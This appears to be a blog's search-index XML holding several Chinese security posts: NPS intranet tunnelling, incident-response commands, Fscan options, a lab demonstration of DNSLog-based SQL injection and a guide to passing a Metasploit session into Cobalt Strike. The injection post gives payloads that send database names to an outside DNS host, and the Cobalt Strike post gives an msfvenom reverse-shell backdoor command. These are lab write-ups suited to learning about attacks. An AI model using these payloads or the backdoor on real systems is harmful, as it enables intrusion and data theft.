<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记录一下NPS隧道如何搭建</title>
      <link href="/2023/11/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8BNPS%E9%9A%A7%E9%81%93%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/11/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8BNPS%E9%9A%A7%E9%81%93%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>本文记录一次利用NPS，访问目标内网机器的过程</p><span id="more"></span><h3 id="什么是NPS"><a href="#什么是NPS" class="headerlink" title="什么是NPS"></a>什么是NPS</h3><p>NPS是一款内网穿透工具 特点是轻量级、高性能。目前支持TCP、UDP流量转发，可支持任何TCP、UDP上层协议(二如访问内网网站、本地支付接口调试、ssh访问、远程桌面、内网DNS解析等等)，此外还支持内网HTTP代理、内网SOCK5代理、P2P等，并且带有强大的web管理端。<br>附上开源地址 Github：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><h3 id="我的目标"><a href="#我的目标" class="headerlink" title="我的目标"></a>我的目标</h3><p>我现在有一台主机A，一台VPS B，B可以和一台处于内网环境的主机通信，目标是去访问这台内网主机上开放的一个告警平台，但是由于VPS只可以命令行操作，没有GUI界面，所以需要利用NPS做一次内网穿透，最后在A上通过代理软件Proxifer 将VPS访问内网主机的流量转发出来，然后我们就可以在A上看到内网主机上的告警平台了。</p><h3 id="NPS的搭建过程"><a href="#NPS的搭建过程" class="headerlink" title="NPS的搭建过程"></a>NPS的搭建过程</h3><p>1.VPS上搭建NPS服务端<br>先下载对应自己VPS的NPS服务端版本(我的是Ubuntu)<br><br>解压命令 tar -xvzf linux_amd64_server.tar.gz<br><br>解压之后当前目录会多出三个文件NPS、web、conf<br><br>安装NPS命令 .&#x2F;nps install<br><br>查看配置文件 &#x2F;etc&#x2F;nps&#x2F;conf&#x2F;nps.conf<br><br>一般需要修改的地方如下<br><br>bridge_port&#x3D;8024      #NPS的服务端和客户端进行连接的默认端口<br><br>web_username&#x3D;admin    #web界面管理账号<br><br>web_password&#x3D;123      #web界面管理密码<br><br>web_port &#x3D; 8080       #web管理端口，通过访问该端口可以访问NPS后台<br><br>启动&#x2F;停止NPS命令 nps start&#x2F;stop<br><br>注意，如果服务开启不了，可能是没有开启端口<br><br>Ubuntu开启某端口命令 sudo ufw allow 端口号<br><br>或者直接关闭防火墙 sudo ufw disable<br><br>访问管理页面 <a href="http://ip:8080/">http://IP:8080</a><br><br>点击客户端，选择新增客户端，可以默认不填写直接新增<br><br>点击隧道进入，模式选择SOCKS5代理，端口可以设置一个空闲的端口(VPS的)，这个端口就是后面攻击机去连接的端口<br><br><br><br>2.客户端(NPS)配置<br>需要对客户端NPC解压命令 tar xzvf linux_amd_64_server.tar.gz<br><br>然后运行在服务端生成的命令 sudo .&#x2F;npc install -server&#x3D;IP:8024 -vkey&#x3D;xxxx -type&#x3D;tcp -log_level&#x3D;0<br><br>最后启动NPC命令 sudo .&#x2F;npc start<br></p><p>这样就搭建好了隧道，下面需要用代理软件Proxifer来进行连接</p><h3 id="Proxifer连接"><a href="#Proxifer连接" class="headerlink" title="Proxifer连接"></a>Proxifer连接</h3><p>VPS和目标已经搭建好了隧道，现在就是需要在自己的主机上面利用Proxifer来进行连接<br><br>启动Proxifer<br><br>菜单栏点击Proxy Servers图标—add，这里添加socks代理，填写socks服务端的IP和端口<br><br>单击Proxification Rules图标—add，这里设置如果访问192.168.10.*这个IP段则走socks5代理<br><br>勾选我们添加的代理规则，默认的代理规勾选为Direct！！！记得<br><br>最后就可以访问了</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/qq_44159028/article/details/122719330">https://blog.csdn.net/qq_44159028/article/details/122719330</a><br><a href="https://blog.csdn.net/Eng_ingLi/article/details/131611171">https://blog.csdn.net/Eng_ingLi/article/details/131611171</a><br>如果侵权，请联系本人(<a href="mailto:&#114;&#101;&#x77;&#x65;&#98;&#x65;&#114;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;">&#114;&#101;&#x77;&#x65;&#98;&#x65;&#114;&#64;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;</a>)删除</p>]]></content>
      
      
      
        <tags>
            
            <tag> 隧道技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于病毒被杀软查杀但态势还是会告警</title>
      <link href="/2023/10/18/%E5%85%B3%E4%BA%8E%E7%97%85%E6%AF%92%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E4%BD%86%E6%80%81%E5%8A%BF%E8%BF%98%E6%98%AF%E4%BC%9A%E5%91%8A%E8%AD%A6/"/>
      <url>/2023/10/18/%E5%85%B3%E4%BA%8E%E7%97%85%E6%AF%92%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E4%BD%86%E6%80%81%E5%8A%BF%E8%BF%98%E6%98%AF%E4%BC%9A%E5%91%8A%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>本文用简短的几句话来描述在杀软实时监测下的主机触发木马病毒被态势感知告警的问题</p><span id="more"></span><h3 id="问题的起因"><a href="#问题的起因" class="headerlink" title="问题的起因"></a>问题的起因</h3><p>在向领导汇报的时候，领导突然问了一句，杀软是实时监测主机的，如果有木马病毒触发告警，应该第一时间被杀掉了呀，既然被查杀掉了，为什么态势感知这边还是会告警呢？由于我就是个菜鸡，一下子就被问住了，正当气氛即将要尴尬起来的时候，我旁边的老师傅开始解释了起来…</p><h3 id="为什么态势感知还是会触发告警"><a href="#为什么态势感知还是会触发告警" class="headerlink" title="为什么态势感知还是会触发告警"></a>为什么态势感知还是会触发告警</h3><p>老师傅对领导说，杀软实时监测的是主机上正在运行的程序，并非该主机上的所有文件。当杀软在对主机上面做全盘查杀的时候，才会对主机上的所有文件进行扫描。当一个木马病毒运行起来的时候，并且做出了一些可疑的动作，比如去外联一个地址，做出这些动作的时候，杀软监测到了，马上对该木马病毒进行查杀，同时这个时候，外联地址这个动作也会产生对应的流量，当流量走向态势感知的时候，态势分析出了该流量存在恶意IP、域名，或者恶意动作，即就触发了告警。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 常见问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下一些常用的应急响应命令</title>
      <link href="/2023/10/05/Linux%E4%B8%8B%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/05/Linux%E4%B8%8B%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>本文记录几个常用的Linux的应急响应命令</p><span id="more"></span><h3 id="最近2分钟修改过的文件"><a href="#最近2分钟修改过的文件" class="headerlink" title="最近2分钟修改过的文件"></a>最近2分钟修改过的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -mmin -2</span><br></pre></td></tr></table></figure><h3 id="最近2分钟修改过的文件并匹配关注的文件"><a href="#最近2分钟修改过的文件并匹配关注的文件" class="headerlink" title="最近2分钟修改过的文件并匹配关注的文件"></a>最近2分钟修改过的文件并匹配关注的文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -mmin -2 | grep 关键字</span><br></pre></td></tr></table></figure><h3 id="查看文件的修改时间"><a href="#查看文件的修改时间" class="headerlink" title="查看文件的修改时间"></a>查看文件的修改时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls --full-time 文件名</span><br></pre></td></tr></table></figure><h3 id="Linux下查看文件的哈希值"><a href="#Linux下查看文件的哈希值" class="headerlink" title="Linux下查看文件的哈希值"></a>Linux下查看文件的哈希值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum 文件名</span><br></pre></td></tr></table></figure><h3 id="windows下查看文件的哈希值"><a href="#windows下查看文件的哈希值" class="headerlink" title="windows下查看文件的哈希值"></a>windows下查看文件的哈希值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile 文件名</span><br></pre></td></tr></table></figure><h3 id="对一个文件的日志进行统计"><a href="#对一个文件的日志进行统计" class="headerlink" title="对一个文件的日志进行统计"></a>对一个文件的日志进行统计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 文件名 | grep 关键字 | wc -l</span><br></pre></td></tr></table></figure><h3 id="查看正在监听的端口"><a href="#查看正在监听的端口" class="headerlink" title="查看正在监听的端口"></a>查看正在监听的端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntplu</span><br></pre></td></tr></table></figure><h3 id="查看开机启动的服务"><a href="#查看开机启动的服务" class="headerlink" title="查看开机启动的服务"></a>查看开机启动的服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><h3 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扫描神器-Fscan</title>
      <link href="/2023/10/04/%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8-Fscan/"/>
      <url>/2023/10/04/%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8-Fscan/</url>
      
        <content type="html"><![CDATA[<p>平时对Fscan的用法就只有Fscan -h ip，在一次实战中，由于对Fscan的用法不够熟悉，导致效率大大降低，今天梳理一下Fscan的几个详细用法。</p><span id="more"></span><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="h"><a href="#h" class="headerlink" title="-h"></a>-h</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-h 指定扫描的目标IP</span><br></pre></td></tr></table></figure><h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 1-65535 指定扫描的端口</span><br></pre></td></tr></table></figure><h3 id="nobr"><a href="#nobr" class="headerlink" title="-nobr"></a>-nobr</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-nobr 指扫描时跳过sql、ftp、ssh等爆破</span><br></pre></td></tr></table></figure><h3 id="np"><a href="#np" class="headerlink" title="-np"></a>-np</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-np 指扫描时跳过存活检测</span><br></pre></td></tr></table></figure><h3 id="nopoc"><a href="#nopoc" class="headerlink" title="-nopoc"></a>-nopoc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-nopoc 指扫描时跳过web poc扫描</span><br></pre></td></tr></table></figure><h3 id="proxy"><a href="#proxy" class="headerlink" title="-proxy"></a>-proxy</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-proxy http://127.0.0.1:9999 指扫描时可以设置代理，可以和bp一起联动使用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Fscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之DNSLog注入</title>
      <link href="/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="一-什么是DNSLog"><a href="#一-什么是DNSLog" class="headerlink" title="一.什么是DNSLog"></a>一.什么是DNSLog</h3><p>DNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器<br><br>下图就是注册之后的，首先需要得到这个Identifier<br><img src="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png" alt="1.png"><br>然后我在本机上ping一下这个Identifier<br><img src="https://s2.loli.net/2024/01/03/g61ElvHIiOspSDe.png" alt="2.png"><br>然后在ceye平台上就会有一个对应的记录<br><img src="https://s2.loli.net/2024/01/03/lCdmPc4N8jt1euJ.png" alt="3.png"></p><h3 id="二-如何利用DNSLog"><a href="#二-如何利用DNSLog" class="headerlink" title="二.如何利用DNSLog"></a>二.如何利用DNSLog</h3><p>在ping 这个地址的时候，是可以变为多级的，比如一开始是 ping xxx.ceye.io ，但是我可以这样<br>ping %username%.xxx.ceye.io<br><img src="https://s2.loli.net/2024/01/03/UkmNL3abqFQCtDO.png" alt="4.png"><br>这样，平台产生的记录，就会得到你当前计算机的用户名(我这里遮掉了)<br><img src="https://s2.loli.net/2024/01/03/NylXuZRBcEUI5DW.png" alt="5.png"><br>那么，同样的道理，我如果这里放一个sql语句，是不是也会执行呢?<br>再补充一个内容，叫UNC，它是windows上面共享资源地址的格式，比如你分享一个文件出去，然后就会产生一个访问这个文件的地址，这个就是UNC的路径，可以理解为UNC就是访问共享资源地址的格式<br>那这个DNSLog和数据库(这里以MYSQL为列)会有什么关联呢？<br>MYSQL里面有一个文件读写的函数，LOAD_FILE(文件路径)</p><p>如何利用这个函数呢？<br>1.需要在mysql的my.ini文件里面配置参数 secure_file_priv<br>在[mysqld]下面配置，配置完了之后需要重启mysql，管理员身份执行 net stop mysql 再net start mysql<br><img src="https://s2.loli.net/2024/01/03/v9bklY5KjyrV6xF.png" alt="6.png"><br>然后再查询看看是否真的打开了 命令 show variables like ‘%secure_file_priv%’，如下图，是打开了的<br><img src="https://s2.loli.net/2024/01/03/aZwAlMUnRhWHOB3.png" alt="7.png"></p><p>2.有了读写权限之后，这个读写函数，只能读取本机的文件，并且读取的字节数要小于max_allowed_packet</p><p>查询max_allowed_packet<br><img src="https://s2.loli.net/2024/01/03/piSAv8sBdDKrjYT.png" alt="8.png"><br>现在读取一个文件试试，路径是D:\d1.txt 命令为 select LOAD_FILE(‘D:\d1.txt’)</p><p>读取出来的内容为16进制之后的<br><img src="https://s2.loli.net/2024/01/03/kJcCTfru5ADZmLz.png" alt="9.png"><br>然后还可以写入一个文件到本地文件，命令 select 123 into outfile ‘E:\out.txt’<br><img src="https://s2.loli.net/2024/01/03/saCopg1xBJjNqEM.png" alt="10.png"><br>那如果我把一个DNS服务器的地址放入，然后再访问这个地址，不就是可以在DNSLog上面看到这个数据库的信息了吗？</p><h3 id="三-DNSLog注入"><a href="#三-DNSLog注入" class="headerlink" title="三.DNSLog注入"></a>三.DNSLog注入</h3><p>先构建这个地址，然后访问</p><p>比如 select load_file(‘&#x2F;&#x2F;&#x2F;&#x2F;aaa.xxx.ceye.io&#x2F;dzh’)，注意，这里的&#x2F;dzh可以是任何内容，比如&#x2F;zxc，但是必须要有</p><p>然后就是，不要在navicat后面执行上面的语句，可能会是如下情况<br><img src="https://www.freeimg.cn/i/2024/01/03/659436ed06731.png" alt="11.png"><br>需要在命令行执行<br><img src="https://www.freeimg.cn/i/2024/01/03/6594370971aad.png" alt="12.png"><br>那么这个aaa，是可以替换为sql语句的，比如我进入一个叫crm的数据库</p><p>并且执行命令 select if((select load_file(concat(‘\\‘,database(),’.xxx.ceye.io\dzh’))),1,0);<br><img src="https://www.freeimg.cn/i/2024/01/03/6594370982e66.png" alt="13.png"><br><img src="https://www.freeimg.cn/i/2024/01/03/659437099276e.png" alt="14.png"><br>最后我们再以sqli-labs靶场的第五关为列子</p><p>在地址后面加上 ‘and if((select load_file(concat(‘\\‘,databse().’xxx.ceye.io\dzh’)))1,0)–+<br><img src="https://www.freeimg.cn/i/2024/01/03/65943709c874f.png" alt="15.png"><br>然后可以在后台看到sqli-labs的数据库<br><img src="https://www.freeimg.cn/i/2024/01/03/6594370976374.png" alt="16.png"><br>后面的步骤就是替换sql语句，来进行其他的注入操作了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于VMware的将主机虚拟适配器连接到次网络无法选中的问题</title>
      <link href="/2022/11/28/%E5%85%B3%E4%BA%8EVMware%E7%9A%84%E5%B0%86%E4%B8%BB%E6%9C%BA%E8%99%9A%E6%8B%9F%E9%80%82%E9%85%8D%E5%99%A8%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%AC%A1%E7%BD%91%E7%BB%9C%E6%97%A0%E6%B3%95%E9%80%89%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/11/28/%E5%85%B3%E4%BA%8EVMware%E7%9A%84%E5%B0%86%E4%B8%BB%E6%9C%BA%E8%99%9A%E6%8B%9F%E9%80%82%E9%85%8D%E5%99%A8%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%AC%A1%E7%BD%91%E7%BB%9C%E6%97%A0%E6%B3%95%E9%80%89%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>这个问题的原因可能是，你之前卸载VMware的时候，没有卸载完全，所以注册表还存在一些相关的垃圾</p><p>这里需要用到CCleaner<br><img src="https://www.z4a.net/images/2024/01/03/1cdfce19f30d0bc77.png" alt="1cdfce19f30d0bc77.png"></p><p>然后就可以勾上了<br><img src="https://www.z4a.net/images/2024/01/03/20c0a3ab4799f6fd1.png" alt="20c0a3ab4799f6fd1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike注入MSF会话</title>
      <link href="/2022/11/27/CobaltStrike%E6%B3%A8%E5%85%A5MSF%E4%BC%9A%E8%AF%9D/"/>
      <url>/2022/11/27/CobaltStrike%E6%B3%A8%E5%85%A5MSF%E4%BC%9A%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>kali机开启CS服务器<br><img src="https://www.z4a.net/images/2024/01/03/1.png" alt="1.png"></p><p>Win10开启msf、CS客户端<br><img src="https://www.z4a.net/images/2024/01/03/2.png" alt="2.png"><br><img src="https://www.z4a.net/images/2024/01/03/3.png" alt="3.png"></p><p>Win7充当一台靶机<br><img src="https://www.z4a.net/images/2024/01/03/4.png" alt="4.png"></p><h3 id="第一步-利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter"><a href="#第一步-利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter" class="headerlink" title="第一步.利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter"></a>第一步.利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter</h3><p>生成后门(路径就是当前路径了，就在桌面)</p><p>命令：msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.21.125.215 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10 -f exe -o payload.exe<br><img src="https://www.z4a.net/images/2024/01/03/5.png" alt="5.png"></p><p>然后把payload.exe上传到win7里面(可以用python开一个服务传递，命令 python -m http.server 端口号，我这里直接上传了)<br><img src="https://www.z4a.net/images/2024/01/03/6.png" alt="6.png"></p><p>利用msf得到meterpreter<br><img src="https://www.z4a.net/images/2024/01/03/7.png" alt="7.png"></p><p>开启监听<br><img src="https://www.z4a.net/images/2024/01/03/8.png" alt="8.png"></p><p>靶机运行payload.exe，即得到meterpreter<br><img src="https://www.z4a.net/images/2024/01/03/9.png" alt="9.png"></p><h3 id="第二步-设置msf，达到与CobaltStrike连接"><a href="#第二步-设置msf，达到与CobaltStrike连接" class="headerlink" title="第二步.设置msf，达到与CobaltStrike连接"></a>第二步.设置msf，达到与CobaltStrike连接</h3><p>先让meterpreter进入后台模式<br><img src="https://www.z4a.net/images/2024/01/03/10.png" alt="10.png"></p><p>然后加载msf的payload注入功能 (use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject)，并且设置payload（set payload windows&#x2F;meterpreter&#x2F;reverse_http)，注意这里末尾是reverse_http<br><img src="https://www.z4a.net/images/2024/01/03/11.png" alt="11.png"></p><p>然后设置参数<br><a href="https://www.z4a.net/image/jA25qw"><img src="https://www.z4a.net/images/2024/01/03/12.png" alt="12.png"></a></p><p><a href="https://www.z4a.net/image/jA2KmN"><img src="https://www.z4a.net/images/2024/01/03/13.png" alt="13.png"></a></p><p>run<br><img src="https://www.z4a.net/images/2024/01/03/14.png" alt="14.png"></p><p>然后设置CS客户端<br><img src="https://www.z4a.net/images/2024/01/03/15.png" alt="15.png"><br><img src="https://www.z4a.net/images/2024/01/03/16.png" alt="16.png"><br><img src="https://www.z4a.net/images/2024/01/03/17.png" alt="17.png"></p><p>如果没有上线，可以在msf中多run几次</p>]]></content>
      
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
